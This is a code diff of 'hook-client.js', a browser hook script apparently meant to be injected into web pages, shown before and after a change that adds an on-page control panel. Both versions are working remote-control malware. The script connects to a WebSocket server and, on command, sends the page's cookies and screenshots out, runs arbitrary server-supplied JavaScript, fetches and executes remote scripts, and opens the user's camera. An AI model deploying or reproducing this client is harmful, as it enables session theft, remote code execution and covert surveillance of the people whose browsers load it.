@@ -1,48 +1,32 @@
 // hook-client.js
-// Robust WebSocket hook client that works with the hook_server_injecting.py server.
-// Features:
-//  - auto-registers with server
-//  - heartbeat + reconnect
-//  - commands: take_screenshot, get_title, get_cookies, eval, evalfile, open_camera, stop_camera, beep, ping
-//  - screenshot uses html2canvas (make sure it's included on the page)
-//  - safe eval via Function wrapper; supports async results
-//  - loads remote scripts via <script> tag for evalfile/scriptUrl
-//  - returns responses/errors to server in JSON
+// Robust hook client + small GUI (shadow DOM) for connect/disconnect, logs, camera, beep.
+// Put this script into your page. Server can inject SERVER_HOST, SERVER_PORT, CLIENT_PATH.
 
 (function () {
-  // ---------- Configuration ----------
-  // SERVER_HOST and SERVER_PORT and CLIENT_PATH are normally injected by the server.
+  // ======= Config & defaults =======
   const DEFAULT_PATH = '/hook';
   const SERVER_HOST_VAL = (typeof SERVER_HOST !== 'undefined') ? SERVER_HOST : (location.hostname || 'localhost');
   const SERVER_PORT_VAL = (typeof SERVER_PORT !== 'undefined') ? String(SERVER_PORT || '') : '';
   const CLIENT_PATH_VAL = (typeof CLIENT_PATH !== 'undefined') ? CLIENT_PATH : DEFAULT_PATH;
+  const AUTO_CONNECT = true; // will auto connect after a short delay
 
-  // browser id
-  const browserId = (typeof window.__hookClientId !== 'undefined') ? window.__hookClientId : ('browser_' + Math.random().toString(36).slice(2,9));
-  window.__hookClientId = browserId;
-
-  // internal state
+  // ======= State =======
   let ws = null;
   let reconnectAttempts = 0;
   let reconnectTimer = null;
   let heartbeatTimer = null;
   let cameraStream = null;
+  let ui = null; // will hold UI methods
+  const browserId = (typeof window.__hookClientId !== 'undefined') ? window.__hookClientId : ('browser_' + Math.random().toString(36).slice(2,9));
+  window.__hookClientId = browserId;
 
-  // ---------- Helpers ----------
-  function safeJsonParse(s) {
-    try { return JSON.parse(s); } catch (e) { return null; }
-  }
-
-  function log(...args) { console.debug('[hook-client]', ...args); }
+  // ======= Helpers =======
+  function logToConsole(...args) { console.debug('[hook-client]', ...args); }
+  function safeJsonParse(s) { try { return JSON.parse(s); } catch (e) { return null; } }
 
   function makeWsUrl() {
-    // Prefer server-provided wsUrl() if it exists
     if (typeof wsUrl === 'function') {
-      try {
-        return wsUrl();
-      } catch (e) {
-        log('wsUrl() function threw, falling back');
-      }
+      try { return wsUrl(); } catch (e) { logToConsole('wsUrl() errored, fallback'); }
     }
     const protocol = (location.protocol === 'https:') ? 'wss' : 'ws';
     const host = SERVER_HOST_VAL || location.hostname;
@@ -53,14 +37,14 @@
 
   function sendJson(obj) {
     if (!ws || ws.readyState !== WebSocket.OPEN) {
-      log('socket not open, cannot send', obj);
+      ui && ui.addLog('⚠ socket not open: cannot send', 'warn');
       return false;
     }
     try {
       ws.send(JSON.stringify(obj));
       return true;
     } catch (err) {
-      console.error('send failed', err);
+      ui && ui.addLog('❌ send failed: ' + (err && err.message), 'error');
       return false;
     }
   }
@@ -72,10 +56,9 @@
       s.src = url;
       s.async = true;
       s.onload = () => { if (!done) { done = true; resolve({ok:true, url}); } };
-      s.onerror = (e) => { if (!done) { done = true; reject(new Error('Failed to load script: ' + url)); } };
+      s.onerror = () => { if (!done) { done = true; reject(new Error('Failed to load script: ' + url)); } };
       document.head.appendChild(s);
-      // optional timeout
-      setTimeout(() => { if (!done) { done = true; reject(new Error('Loading script timed out: ' + url)); } }, timeoutMs);
+      setTimeout(() => { if (!done) { done = true; reject(new Error('Script load timed out')); } }, timeoutMs);
     });
   }
 
@@ -92,131 +75,84 @@
     }
   }
 
-  // ---------- Command handlers ----------
-  async function handleTakeScreenshot(command) {
+  // ======= Command handlers =======
+  async function handleTakeScreenshot(command = {}) {
     try {
       if (typeof html2canvas !== 'function') throw new Error('html2canvas not available');
+      ui && ui.addLog('📸 capturing screenshot...', 'info');
       const canvas = await html2canvas(document.body);
       const dataUrl = canvas.toDataURL('image/png');
-      sendJson({
-        type: 'response',
-        subtype: 'screenshot',
-        data: dataUrl,
-        browserId,
-        url: location.href,
-        commandId: command.commandId || null,
-        ts: new Date().toISOString()
-      });
-      log('screenshot sent');
+      sendJson({ type: 'response', subtype: 'screenshot', data: dataUrl, browserId, url: location.href, commandId: command.commandId || null, ts: new Date().toISOString() });
+      ui && ui.addLog('✅ screenshot sent', 'success');
     } catch (err) {
-      sendJson({
-        type: 'error',
-        data: String(err && err.message ? err.message : err),
-        browserId,
-        commandId: command.commandId || null,
-        ts: new Date().toISOString()
-      });
-      log('screenshot failed', err);
+      sendJson({ type: 'error', data: String(err && err.message ? err.message : err), browserId, commandId: command.commandId || null, ts: new Date().toISOString() });
+      ui && ui.addLog('❌ screenshot failed: ' + (err && err.message), 'error');
     }
   }
 
-  function handleGetTitle(command) {
+  function handleGetTitle(command = {}) {
     try {
-      sendJson({
-        type: 'response',
-        subtype: 'title',
-        data: document.title,
-        browserId,
-        url: location.href,
-        commandId: command.commandId || null,
-        ts: new Date().toISOString()
-      });
+      sendJson({ type: 'response', subtype: 'title', data: document.title, browserId, url: location.href, commandId: command.commandId || null, ts: new Date().toISOString() });
+      ui && ui.addLog('📄 title sent', 'info');
     } catch (err) {
       sendJson({ type: 'error', data: String(err), browserId, commandId: command.commandId || null });
+      ui && ui.addLog('❌ title error', 'error');
     }
   }
 
-  function handleGetCookies(command) {
+  function handleGetCookies(command = {}) {
     try {
-      sendJson({
-        type: 'response',
-        subtype: 'cookies',
-        data: document.cookie,
-        browserId,
-        url: location.href,
-        commandId: command.commandId || null,
-        ts: new Date().toISOString()
-      });
+      sendJson({ type: 'response', subtype: 'cookies', data: document.cookie, browserId, url: location.href, commandId: command.commandId || null, ts: new Date().toISOString() });
+      ui && ui.addLog('🍪 cookies sent', 'info');
     } catch (err) {
       sendJson({ type: 'error', data: String(err), browserId, commandId: command.commandId || null });
+      ui && ui.addLog('❌ cookies error', 'error');
     }
   }
 
-  async function handleEval(command) {
+  async function handleEval(command = {}) {
     try {
       if (!command.code) throw new Error('No code provided');
-      // run in Function wrapper to avoid accessing page scope accidentally
+      ui && ui.addLog('⚡ running eval...', 'info');
       const fn = new Function('"use strict";\n' + (command.code || ''));
       let result = fn();
       if (result instanceof Promise) result = await result;
-      // Try to send result (serialize safely)
       let payload = result;
-      try { payload = (typeof result === 'undefined' ? null : result); } catch(e){}
-      sendJson({
-        type: 'response',
-        subtype: 'eval',
-        data: payload,
-        browserId,
-        url: location.href,
-        commandId: command.commandId || null,
-        ts: new Date().toISOString()
-      });
+      try { payload = (typeof result === 'undefined' ? null : result); } catch (e) {}
+      sendJson({ type: 'response', subtype: 'eval', data: payload, browserId, url: location.href, commandId: command.commandId || null, ts: new Date().toISOString() });
+      ui && ui.addLog('✅ eval result sent', 'success');
     } catch (err) {
-      sendJson({
-        type: 'error',
-        data: String(err && err.message ? err.message : err),
-        browserId,
-        commandId: command.commandId || null,
-        ts: new Date().toISOString()
-      });
+      sendJson({ type: 'error', data: String(err && err.message ? err.message : err), browserId, commandId: command.commandId || null });
+      ui && ui.addLog('❌ eval error: ' + (err && err.message), 'error');
     }
   }
 
-  async function handleEvalFile(command) {
-    // Accepts: command.code  OR command.scriptUrl OR command.fileUrl
+  async function handleEvalFile(command = {}) {
     try {
-      if (command.code) {
-        await handleEval(command);
-        return;
-      }
-      if (command.scriptUrl) {
-        await loadScriptUrl(command.scriptUrl);
-        sendJson({ type: 'response', subtype: 'eval', data: `loaded ${command.scriptUrl}`, browserId, commandId: command.commandId || null, ts: new Date().toISOString() });
-        return;
-      }
+      if (command.code) { await handleEval(command); return; }
+      if (command.scriptUrl) { await loadScriptUrl(command.scriptUrl); sendJson({ type: 'response', subtype: 'eval', data: `loaded ${command.scriptUrl}`, browserId, commandId: command.commandId || null, ts: new Date().toISOString() }); ui && ui.addLog('✅ scriptUrl loaded', 'success'); return; }
       if (command.fileUrl) {
         const text = await fetchText(command.fileUrl);
-        // run fetched code
         const fn = new Function('"use strict";\n' + text);
         let result = fn();
         if (result instanceof Promise) result = await result;
         sendJson({ type: 'response', subtype: 'eval', data: (result === undefined ? null : result), browserId, commandId: command.commandId || null, ts: new Date().toISOString() });
+        ui && ui.addLog('✅ fileUrl fetched & executed', 'success');
         return;
       }
       throw new Error('evalfile requires code, scriptUrl or fileUrl');
     } catch (err) {
       sendJson({ type: 'error', data: String(err && err.message ? err.message : err), browserId, commandId: command.commandId || null });
+      ui && ui.addLog('❌ evalfile error: ' + (err && err.message), 'error');
     }
   }
 
-  async function handleOpenCamera(command) {
+  async function handleOpenCamera(command = {}) {
     try {
-      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        throw new Error('getUserMedia not supported');
-      }
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) throw new Error('getUserMedia not supported');
       const constraints = command.constraints || { video: true, audio: false };
+      ui && ui.addLog('📷 requesting camera...', 'info');
       const stream = await navigator.mediaDevices.getUserMedia(constraints);
-      // attach to a small floating video element
       let v = document.getElementById('__hook_client_camera');
       if (!v) {
         v = document.createElement('video');
@@ -234,29 +170,27 @@
       v.srcObject = stream;
       cameraStream = stream;
       sendJson({ type: 'response', subtype: 'camera', data: 'started', browserId, commandId: command.commandId || null, ts: new Date().toISOString() });
+      ui && ui.addLog('✅ camera started', 'success');
     } catch (err) {
       sendJson({ type: 'error', data: String(err && err.message ? err.message : err), browserId, commandId: command.commandId || null });
+      ui && ui.addLog('❌ camera error: ' + (err && err.message), 'error');
     }
   }
 
-  function handleStopCamera(command) {
+  function handleStopCamera(command = {}) {
     try {
-      if (cameraStream) {
-        cameraStream.getTracks().forEach(t => t.stop());
-        cameraStream = null;
-      }
+      if (cameraStream) { cameraStream.getTracks().forEach(t => t.stop()); cameraStream = null; }
       const v = document.getElementById('__hook_client_camera');
-      if (v) {
-        v.srcObject = null;
-        try { v.remove(); } catch (e) {}
-      }
+      if (v) { v.srcObject = null; try { v.remove(); } catch (e) {} }
       sendJson({ type: 'response', subtype: 'camera', data: 'stopped', browserId, commandId: command.commandId || null, ts: new Date().toISOString() });
+      ui && ui.addLog('⏹ camera stopped', 'info');
     } catch (err) {
       sendJson({ type: 'error', data: String(err), browserId, commandId: command.commandId || null });
+      ui && ui.addLog('❌ stop camera error', 'error');
     }
   }
 
-  function handleBeep(command) {
+  function handleBeep(command = {}) {
     try {
       const duration = (command.duration != null) ? Number(command.duration) : 200;
       const frequency = (command.frequency != null) ? Number(command.frequency) : 440;
@@ -274,123 +208,89 @@
       const now = ctx.currentTime;
       osc.start(now);
       osc.stop(now + duration / 1000);
-      // close context after a little delay where supported
       setTimeout(() => { try { ctx.close(); } catch(e){} }, duration + 50);
       sendJson({ type: 'response', subtype: 'beep', data: 'played', browserId, commandId: command.commandId || null, ts: new Date().toISOString() });
+      ui && ui.addLog('🔔 beep played', 'info');
     } catch (err) {
       sendJson({ type: 'error', data: String(err), browserId, commandId: command.commandId || null });
+      ui && ui.addLog('❌ beep error: ' + (err && err.message), 'error');
     }
   }
 
-  // Generic command dispatcher
+  // Generic dispatcher
   async function handleServerCommand(command) {
-    if (!command || !command.type) {
-      log('unknown server payload', command);
-      return;
-    }
+    if (!command || !command.type) { ui && ui.addLog('⚠ unknown server payload', 'warn'); return; }
+    ui && ui.addLog('⬅️ cmd: ' + (command.type || 'unknown'), 'info');
     switch (command.type) {
-      case 'take_screenshot':
-        return await handleTakeScreenshot(command);
+      case 'take_screenshot': return await handleTakeScreenshot(command);
       case 'get_title':
-      case 'get_page_title':
-        return handleGetTitle(command);
-      case 'get_cookies':
-        return handleGetCookies(command);
-      case 'eval':
-        return await handleEval(command);
-      case 'evalfile':
-        return await handleEvalFile(command);
+      case 'get_page_title': return handleGetTitle(command);
+      case 'get_cookies': return handleGetCookies(command);
+      case 'eval': return await handleEval(command);
+      case 'evalfile': return await handleEvalFile(command);
       case 'open_camera':
-      case 'start_camera':
-        return await handleOpenCamera(command);
-      case 'stop_camera':
-        return handleStopCamera(command);
-      case 'beep':
-        return handleBeep(command);
-      case 'ping':
-        return sendJson({ type: 'pong', ts: Date.now(), browserId, commandId: command.commandId || null });
-      default:
-        // fallback: echo the command back
-        sendJson({ type: 'response', subtype: 'unknown', data: command, browserId, commandId: command.commandId || null });
+      case 'start_camera': return await handleOpenCamera(command);
+      case 'stop_camera': return handleStopCamera(command);
+      case 'beep': return handleBeep(command);
+      case 'ping': return sendJson({ type: 'pong', ts: Date.now(), browserId, commandId: command.commandId || null });
+      default: return sendJson({ type: 'response', subtype: 'unknown', data: command, browserId, commandId: command.commandId || null });
     }
   }
 
-  // ---------- Connection lifecycle ----------
+  // ======= Connection lifecycle =======
   function startHeartbeat() {
     stopHeartbeat();
     heartbeatTimer = setInterval(() => {
-      if (ws && ws.readyState === WebSocket.OPEN) {
-        sendJson({ type: 'ping', ts: Date.now(), browserId });
-      }
+      if (ws && ws.readyState === WebSocket.OPEN) sendJson({ type: 'ping', ts: Date.now(), browserId });
     }, 20000);
   }
-  function stopHeartbeat() {
-    if (heartbeatTimer) { clearInterval(heartbeatTimer); heartbeatTimer = null; }
-  }
+  function stopHeartbeat() { if (heartbeatTimer) { clearInterval(heartbeatTimer); heartbeatTimer = null; } }
 
   function scheduleReconnect() {
     reconnectAttempts++;
-    const delay = Math.min(60000, Math.pow(2, Math.min(reconnectAttempts, 8)) * 1000) + Math.floor(Math.random()*1000);
-    log('reconnect in ms', delay);
+    const delay = Math.min(60000, Math.pow(2, Math.min(reconnectAttempts, 8)) * 1000) + Math.floor(Math.random() * 1000);
+    ui && ui.addLog('↻ reconnect in ' + Math.round(delay/1000) + 's', 'info');
     if (reconnectTimer) clearTimeout(reconnectTimer);
-    reconnectTimer = setTimeout(() => {
-      connect();
-    }, delay);
+    reconnectTimer = setTimeout(() => connect(), delay);
   }
 
   function connect() {
-    if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) {
-      log('already connected or connecting');
-      return;
-    }
+    if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) { ui && ui.addLog('already connected', 'info'); return; }
     const url = makeWsUrl();
-    log('connecting to', url);
+    ui && ui.setStatus('connecting', url);
+    ui && ui.addLog('➡ connecting to ' + url, 'info');
     try {
       ws = new WebSocket(url);
     } catch (err) {
-      log('WebSocket constructor error', err);
+      ui && ui.addLog('❌ WebSocket constructor failed: ' + (err && err.message), 'error');
       scheduleReconnect();
       return;
     }
 
     ws.onopen = () => {
       reconnectAttempts = 0;
-      log('connected, sending register');
-      sendJson({
-        type: 'register',
-        browserId,
-        userAgent: navigator.userAgent,
-        url: location.href,
-        path: CLIENT_PATH_VAL,
-        ts: new Date().toISOString()
-      });
+      ui && ui.setStatus('connected');
+      ui && ui.addLog('✅ connected, sending register', 'success');
+      sendJson({ type: 'register', browserId, userAgent: navigator.userAgent, url: location.href, path: CLIENT_PATH_VAL, ts: new Date().toISOString() });
       startHeartbeat();
     };
 
     ws.onmessage = async (evt) => {
       const payload = safeJsonParse(evt.data);
-      if (!payload) {
-        log('raw message', evt.data);
-        return;
-      }
+      if (!payload) { ui && ui.addLog('⟵ raw: ' + String(evt.data).slice(0,200), 'info'); return; }
       if (payload.type === 'registered') {
-        log('server registered id=', payload.browserId);
-        // server assigned id might be authoritative; store it
-        if (payload.browserId && payload.browserId !== browserId) {
-          window.__hookClientId = payload.browserId;
-        }
+        ui && ui.addLog('✅ server registered id=' + payload.browserId, 'success');
+        if (payload.browserId && payload.browserId !== browserId) { window.__hookClientId = payload.browserId; }
         return;
       }
-      // handle command
       await handleServerCommand(payload);
     };
 
-    ws.onerror = (ev) => {
-      console.warn('WS error', ev);
-    };
+    ws.onerror = (ev) => { ui && ui.addLog('⚠ websocket error', 'warn'); console.warn('WS error', ev); };
 
     ws.onclose = (ev) => {
-      log('socket closed', ev && ev.code, ev && ev.reason);
+      ui && ui.addLog('⤫ closed (' + (ev && ev.code) + ')', 'warn');
+      ui && ui.setStatus('disconnected');
       stopHeartbeat();
       scheduleReconnect();
     };
@@ -399,13 +299,143 @@
   function disconnect() {
     stopHeartbeat();
     if (reconnectTimer) { clearTimeout(reconnectTimer); reconnectTimer = null; }
-    if (ws) {
-      try { ws.close(); } catch (e) {}
-      ws = null;
-    }
+    if (ws) { try { ws.close(); } catch (e) {} ws = null; }
+    ui && ui.setStatus('disconnected');
+    ui && ui.addLog('🛑 disconnected by user', 'info');
   }
 
-  // ---------- Public API ----------
+  // ======= UI injection (shadow DOM) =======
+  function createUI() {
+    // Already created?
+    if (document.getElementById('__hook_client_ui_root')) return null;
+
+    const container = document.createElement('div');
+    container.id = '__hook_client_ui_root';
+    // use shadow DOM to isolate styles
+    const shadow = container.attachShadow({ mode: 'open' });
+
+    // styles
+    const style = document.createElement('style');
+    style.textContent = `
+      :host { font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; }
+      .panel {
+        position: fixed;
+        left: 12px;
+        bottom: 12px;
+        width: 320px;
+        background: rgba(20,20,30,0.92);
+        color: #fff;
+        border-radius: 10px;
+        box-shadow: 0 6px 18px rgba(0,0,0,0.4);
+        z-index: 2147483647;
+        overflow: hidden;
+        font-size: 13px;
+        -webkit-user-select: none;
+      }
+      .head { display:flex; align-items:center; gap:8px; padding:10px; background: linear-gradient(90deg,#111,#1a1a2e); }
+      .title { font-weight:700; font-size:14px; }
+      .id { font-size:11px; opacity:0.85; margin-left:auto; }
+      .status { display:inline-block; padding:4px 8px; border-radius:999px; font-weight:700; font-size:11px; margin-left:8px;}
+      .status.disconnected { background:#b71c1c; color:#fff; }
+      .status.connecting { background:#ff9800; color:#092; }
+      .status.connected { background:#22863a; color:#fff; }
+      .body { padding:10px; display:flex; flex-direction:column; gap:8px; }
+      .controls { display:flex; gap:8px; align-items:center; }
+      button { background:#ffd166; color:#1a1a1a; border:none; padding:8px 10px; border-radius:6px; cursor:pointer; font-weight:700; }
+      button.secondary { background:transparent; border:1px solid rgba(255,255,255,0.08); color:#fff; font-weight:600; padding:6px 8px; }
+      .log { height:120px; overflow:auto; background:rgba(0,0,0,0.25); padding:8px; border-radius:6px; font-family:monospace; font-size:12px; }
+      .log .entry { margin-bottom:6px; line-height:1.2; }
+      .tag { display:inline-block; padding:2px 6px; border-radius:4px; font-size:11px; margin-right:6px; }
+      .tag.info { background:rgba(255,255,255,0.06); color:#fff; }
+      .tag.warn { background:#ffb74d; color:#111; }
+      .tag.error { background:#ef5350; color:#111; }
+      .footer { display:flex; gap:8px; align-items:center; justify-content:space-between; padding:8px; background:rgba(255,255,255,0.02); }
+      .small { font-size:11px; color:rgba(255,255,255,0.8); }
+    `;
+
+    // markup
+    const panel = document.createElement('div');
+    panel.className = 'panel';
+    panel.innerHTML = `
+      <div class="head">
+        <div class="title">WebSocket Explorer (hook)</div>
+        <div class="id small" id="ui-browser-id">${browserId}</div>
+        <div id="ui-status" class="status disconnected">disconnected</div>
+      </div>
+      <div class="body">
+        <div class="controls">
+          <button id="ui-connect">Connect</button>
+          <button id="ui-disconnect" class="secondary" disabled>Disconnect</button>
+          <button id="ui-camera" class="secondary">Camera</button>
+          <button id="ui-beep" class="secondary">Beep</button>
+        </div>
+        <div class="log" id="ui-log"></div>
+      </div>
+      <div class="footer">
+        <div class="small">host: <span id="ui-host">${SERVER_HOST_VAL}${SERVER_PORT_VAL ? ':' + SERVER_PORT_VAL : ''}</span></div>
+        <div class="small">path: <span id="ui-path">${CLIENT_PATH_VAL}</span></div>
+      </div>
+    `;
+
+    shadow.appendChild(style);
+    shadow.appendChild(panel);
+    document.body.appendChild(container);
+
+    // UI helpers linked to DOM inside shadow
+    const get = (sel) => shadow.querySelector(sel);
+    const statusEl = get('#ui-status');
+    const logEl = get('#ui-log');
+    const connectBtn = get('#ui-connect');
+    const disconnectBtn = get('#ui-disconnect');
+    const cameraBtn = get('#ui-camera');
+    const beepBtn = get('#ui-beep');
+
+    function setStatus(state, extra) {
+      statusEl.classList.remove('connected', 'disconnected', 'connecting');
+      if (state === 'connected') statusEl.classList.add('connected'), statusEl.textContent = 'connected';
+      else if (state === 'connecting') statusEl.classList.add('connecting'), statusEl.textContent = 'connecting';
+      else statusEl.classList.add('disconnected'), statusEl.textContent = 'disconnected';
+      if (extra) statusEl.title = extra;
+      connectBtn.disabled = (state === 'connected' || state === 'connecting');
+      disconnectBtn.disabled = (state !== 'connected' && state !== 'connecting');
+    }
+
+    function addLog(text, level = 'info') {
+      const entry = document.createElement('div');
+      entry.className = 'entry';
+      const tag = document.createElement('span');
+      tag.className = 'tag ' + (level === 'warn' ? 'warn' : (level === 'error' ? 'error' : 'info'));
+      tag.textContent = level.toUpperCase();
+      const span = document.createElement('span');
+      span.textContent = ' ' + text;
+      entry.appendChild(tag);
+      entry.appendChild(span);
+      logEl.appendChild(entry);
+      logEl.scrollTop = logEl.scrollHeight;
+      // keep logs reasonable length
+      while (logEl.children.length > 200) logEl.removeChild(logEl.firstChild);
+    }
+
+    // wire buttons
+    connectBtn.addEventListener('click', () => { connect(); });
+    disconnectBtn.addEventListener('click', () => { disconnect(); });
+    cameraBtn.addEventListener('click', () => {
+      // toggle camera
+      if (cameraStream) { handleStopCamera(); } else { handleOpenCamera({ commandId: 'ui_camera' }); }
+    });
+    beepBtn.addEventListener('click', () => { handleBeep({ duration: 200, frequency: 880, volume: 0.3, commandId: 'ui_beep' }); });
+
+    return {
+      container, shadow, setStatus, addLog, getEl: get
+    };
+  }
+
+  // create UI when DOM ready
+  function ensureUI() {
+    if (!ui) ui = createUI();
+  }
+
+  // ======= Expose public API and auto-start =======
   window.__hookClient = {
     connect,
     disconnect,
@@ -416,9 +446,22 @@
     beep: (opts) => { handleBeep(Object.assign({}, opts, { commandId: 'manual_beep' })); },
   };
 
-  // auto-connect after a short delay to allow page to settle
-  setTimeout(() => {
-    try { connect(); } catch (e) { log('connect failed', e); }
-  }, 200);
+  // ensure UI as soon as possible
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', ensureUI);
+  } else {
+    ensureUI();
+  }
+
+  // small delay before auto-connecting (so UI appears)
+  if (AUTO_CONNECT) setTimeout(() => { try { connect(); } catch (e) { ui && ui.addLog('connect failed: ' + e.message, 'error'); } }, 250);
+
+  // update UI status from state changes periodically in case early missing
+  setInterval(() => {
+    if (!ui) return;
+    if (ws && ws.readyState === WebSocket.OPEN) ui.setStatus && ui.setStatus('connected');
+    else if (ws && ws.readyState === WebSocket.CONNECTING) ui.setStatus && ui.setStatus('connecting');
+    else ui.setStatus && ui.setStatus('disconnected');
+  }, 1000);
 
 })();
